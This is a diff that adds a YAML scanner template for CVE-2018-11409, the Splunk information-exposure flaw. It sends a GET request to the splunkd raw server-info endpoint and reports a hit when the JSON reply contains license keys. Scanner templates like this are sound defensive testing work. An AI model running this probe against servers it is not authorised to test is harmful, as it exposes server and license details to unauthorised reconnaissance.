@@ -1,0 +1,18 @@
+id: splunk-cve-01
+info:
+  name: Splunk Licencse Exposed - CVE-2018-11409
+  risk: Medium
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+     {{.BaseURL}}/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "application/json") && StringSearch("response", "licenseKeys")
+
+reference:
+  - link: https://www.splunk.com/view/SP-CAAAP5E
